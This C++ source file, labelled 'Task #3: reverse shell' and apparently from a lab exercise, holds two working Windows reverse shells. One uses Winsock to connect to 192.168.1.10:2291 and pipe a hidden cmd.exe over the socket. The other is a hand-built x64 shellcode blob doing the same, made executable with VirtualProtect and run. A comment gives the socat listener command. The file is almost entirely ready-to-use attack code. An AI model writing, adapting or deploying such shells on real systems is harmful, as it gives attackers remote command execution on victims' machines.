// Task #3: reverse shell 
// Server:  $ socat TCP4-LISTEN:2291 STDIO
#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

using namespace std;


int RunDemo()
{
	// Initialize local vars
	WSADATA stWsaData = { 0 };
	SOCKADDR_IN stAddrClient = { 0 };
	STARTUPINFOA stStartupInfo = { 0 };
	PROCESS_INFORMATION stProcessInfo = { 0 };

	string szIp = "192.168.1.10";
	string szShell = "cmd.exe";
	string szTestMsg = "[+] Socket works\n";

	int iPort = 2291;
	SOCKET iSockClient = 0;

	// Create client socket 
	WSAStartup(MAKEWORD(2, 2), &stWsaData);	// MAKEWORD(2, 2) = 514
	iSockClient = WSASocketW(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	// Initialize SOCKADDR_IN structure
	stAddrClient.sin_family = AF_INET;
	InetPtonA(AF_INET, szIp.c_str(), &(stAddrClient.sin_addr));
	stAddrClient.sin_port = htons(iPort);

	// Connect to server
	connect(iSockClient, (SOCKADDR*)&stAddrClient, sizeof(stAddrClient));
	send(iSockClient, szTestMsg.c_str(), szTestMsg.length(), 0);

	// Initialize STARTUPINFOA structure
	stStartupInfo.cb = sizeof(STARTUPINFOA);
	stStartupInfo.wShowWindow = SW_HIDE;
	stStartupInfo.dwFlags = STARTF_USESTDHANDLES;
	stStartupInfo.hStdInput = (HANDLE)iSockClient;
	stStartupInfo.hStdOutput = (HANDLE)iSockClient;
	stStartupInfo.hStdError = (HANDLE)iSockClient;

	// Set UTF-8 encoding
	SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);

	// Spawn shell
	CreateProcessA(NULL, (LPSTR)szShell.c_str(), NULL, NULL, TRUE,
		0, NULL, NULL, (STARTUPINFOA*)&stStartupInfo, &stProcessInfo);

	// Sleep & close socket
	Sleep(2000);
	closesocket(iSockClient);
	return 0;
}


int RunShellcode()
{
	char shellcode[] = "\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x38\x03\x00\x48\x8d\x0d\x83\x04\x00\x00\xe8\xcb\x02\x00\x00\x48\x89\x45\xf0\x48\x8d\x0d\x80\x04\x00\x00\xe8\xbb\x02\x00\x00\x48\x89\x45\xe8\x48\x8d\x0d\x56\x04\x00\x00\xff\x55\xf0\x48\x89\x45\xf8\x48\x8b\x4d\xf8\x48\x8d\x15\x6d\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xe0\x48\x8b\x4d\xf8\x48\x8d\x15\x68\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xd8\x48\x8b\x4d\xf8\x48\x8d\x15\x69\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xd0\x48\x8b\x4d\xf8\x48\x8d\x15\x66\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xc8\x48\x8d\x0d\x5e\x04\x00\x00\xff\x55\xf0\x48\x89\x45\xc0\x48\x8b\x4d\xc0\x48\x8d\x15\x57\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xb8\x48\x8b\x4d\xc0\x48\x8d\x15\x50\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xb0\x48\x8b\x4d\xc0\x48\x8d\x15\x49\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xa8\x48\x8b\x4d\xc0\x48\x8d\x15\x41\x04\x00\x00\xff\x55\xe8\x48\x89\x45\xa0\x48\x8b\x4d\xc0\x48\x8d\x15\x35\x04\x00\x00\xff\x55\xe8\x48\x89\x45\x98\x48\x8b\x4d\xc0\x48\x8d\x15\x30\x04\x00\x00\xff\x55\xe8\x48\x89\x45\x88\x48\x8b\x4d\xc0\x48\x8d\x15\x19\x04\x00\x00\xff\x55\xe8\x48\x89\x45\x90\x48\x8d\x8d\xf0\xfd\xff\xff\xba\x98\x01\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\xbd\x02\x00\x00\x48\x8d\x8d\xe0\xfd\xff\xff\xba\x10\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\xa6\x02\x00\x00\x48\x8d\x8d\x78\xfd\xff\xff\xba\x68\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x8f\x02\x00\x00\x48\x8d\x8d\x60\xfd\xff\xff\xba\x18\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x78\x02\x00\x00\x48\xc7\x85\x58\xfd\xff\xff\xf3\x08\x00\x00\x48\xc7\x85\x50\xfd\xff\xff\x00\x00\x00\x00\xb9\x02\x02\x00\x00\x48\x8d\x95\xf0\xfd\xff\xff\xff\x55\xb8\xb9\x02\x00\x00\x00\xba\x01\x00\x00\x00\x41\xb8\x00\x00\x00\x00\x41\xb9\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x48\xc7\x44\x24\x28\x00\x00\x00\x00\xff\x55\xb0\x48\x89\x85\x50\xfd\xff\xff\x4c\x8d\xa5\xe0\xfd\xff\xff\x66\x41\xc7\x04\x24\x02\x00\xb9\x02\x00\x00\x00\x48\x8d\x15\x56\x03\x00\x00\x4d\x8d\x44\x24\x04\xff\x55\xa8\x48\x8b\x8d\x58\xfd\xff\xff\xff\x55\xa0\x66\x41\x89\x44\x24\x02\x48\x8b\x8d\x50\xfd\xff\xff\x48\x8d\x95\xe0\xfd\xff\xff\x41\xb8\x10\x00\x00\x00\xff\x55\x98\x48\x8b\x8d\x50\xfd\xff\xff\x48\x8d\x15\x2f\x03\x00\x00\x41\xb8\x13\x00\x00\x00\x41\xb9\x00\x00\x00\x00\xff\x55\x90\x4c\x8b\xb5\x50\xfd\xff\xff\x4c\x8d\xa5\x78\xfd\xff\xff\x41\xc7\x04\x24\x68\x00\x00\x00\x66\x41\xc7\x44\x24\x40\x00\x00\x41\xc7\x44\x24\x3c\x00\x01\x00\x00\x4d\x89\x74\x24\x50\x4d\x89\x74\x24\x58\x4d\x89\x74\x24\x60\xb9\xe9\xfd\x00\x00\xff\x55\xe0\xb9\xe9\xfd\x00\x00\xff\x55\xd8\x4c\x8d\xa5\x78\xfd\xff\xff\x4c\x8d\xad\x60\xfd\xff\xff\xb9\x00\x00\x00\x00\x48\x8d\x15\xb8\x02\x00\x00\x41\xb8\x00\x00\x00\x00\x41\xb9\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x01\x00\x00\x00\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x48\xc7\x44\x24\x30\x00\x00\x00\x00\x48\xc7\x44\x24\x38\x00\x00\x00\x00\x4c\x89\x64\x24\x40\x4c\x89\x6c\x24\x48\xff\x55\xd0\xb9\xd0\x07\x00\x00\xff\x55\xc8\x48\x8b\x8d\x50\xfd\xff\xff\xff\x55\x88\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\xa8\x00\x00\x48\x89\x4d\xf8\x48\x8b\x4d\xf8\xe8\x2a\x01\x00\x00\x48\x89\x45\xf0\x65\x48\x8b\x1c\x25\x60\x00\x00\x00\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x48\x89\x5d\xe8\x4c\x8b\x65\xe8\x41\x8b\x5c\x24\x3c\x4c\x01\xe3\x8b\x9b\x88\x00\x00\x00\x4c\x01\xe3\xb9\x00\x00\x00\x00\x8b\x4b\x10\x48\x89\x4d\xe0\x8b\x4b\x18\x48\x89\x4d\xd8\x8b\x4b\x1c\x4c\x01\xe1\x48\x89\x4d\xd0\x8b\x4b\x20\x4c\x01\xe1\x48\x89\x4d\xc8\x8b\x4b\x24\x4c\x01\xe1\x48\x89\x4d\xc0\x41\xbf\x00\x00\x00\x00\x4c\x8b\x65\xc8\x43\x8b\x1c\xbc\x48\x03\x5d\xe8\x48\x89\x5d\xb8\x4c\x89\x7d\xb0\x48\x8b\x4d\xb8\xe8\x9e\x00\x00\x00\x48\x3b\x45\xf0\x74\x09\x49\xff\xc7\x4c\x3b\x7d\xd8\x75\xd4\xb8\x00\x00\x00\x00\x4c\x8b\x65\xc0\x4c\x8b\x7d\xb0\x66\x43\x8b\x04\x7c\x48\x03\x45\xe0\x48\x89\x45\xa8\xb8\x00\x00\x00\x00\x4c\x8b\x65\xd0\x4c\x8b\x7d\xa8\x4c\x2b\x7d\xe0\x43\x8b\x04\xbc\x48\x03\x45\xe8\x48\x89\x45\xa0\x48\x8b\x45\xa0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x68\x00\x00\x48\x89\x4d\xf8\x48\x89\x55\xf0\x4c\x89\x45\xe8\x4c\x8b\x65\xf8\x4c\x8b\x6d\xf0\x4c\x8b\x75\xe8\x41\xbf\x00\x00\x00\x00\x4f\x89\x34\x3c\x49\x83\xc7\x08\x4d\x39\xef\x75\xf3\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x58\x00\x00\x48\x89\x4d\xf8\x4c\x8b\x5d\xf8\x41\xbc\x00\x00\x00\x00\x41\xbf\x00\x00\x00\x00\xbb\x00\x00\x00\x00\x43\x8a\x1c\x3b\x48\x83\xfb\x00\x74\x0c\x41\xc1\xcc\x0d\x49\x01\xdc\x49\xff\xc7\xeb\xe5\x4c\x89\xe0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x00\x00\xf5\xff\xff\xff\xff\xff\xff\xff\x0a\x00\x70\x61\x75\x73\x65\x00\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x53\x65\x74\x43\x6f\x6e\x73\x6f\x6c\x65\x43\x50\x00\x53\x65\x74\x43\x6f\x6e\x73\x6f\x6c\x65\x4f\x75\x74\x70\x75\x74\x43\x50\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00\x53\x6c\x65\x65\x70\x00\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57\x53\x41\x53\x6f\x63\x6b\x65\x74\x57\x00\x69\x6e\x65\x74\x5f\x70\x74\x6f\x6e\x00\x68\x74\x6f\x6e\x73\x00\x63\x6f\x6e\x6e\x65\x63\x74\x00\x73\x65\x6e\x64\x00\x63\x6c\x6f\x73\x65\x73\x6f\x63\x6b\x65\x74\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x00\x00\x63\x6d\x64\x2e\x65\x78\x65\x00\x5b\x2b\x5d\x20\x53\x6f\x63\x6b\x65\x74\x20\x77\x6f\x72\x6b\x73\x0a\x0a\x00";

	cout << "Shellcode size: " << sizeof(shellcode) << endl;
	DWORD flOldProtect;
	BOOL ret = VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &flOldProtect);
	if (!ret)
	{
		cout << "[-] VirtualProtect is enabled" << endl;
		return 1;
	}
	(*(void (*)()) & shellcode)();
	return 0;
}


int main(int argc, char* argv[])
{
	cout << "[*] Connecting to attacker..." << endl;

	// RunDemo();
	RunShellcode();

	cout << "[+] Connected to attacker" << endl;
	system("pause");
	return 0;
}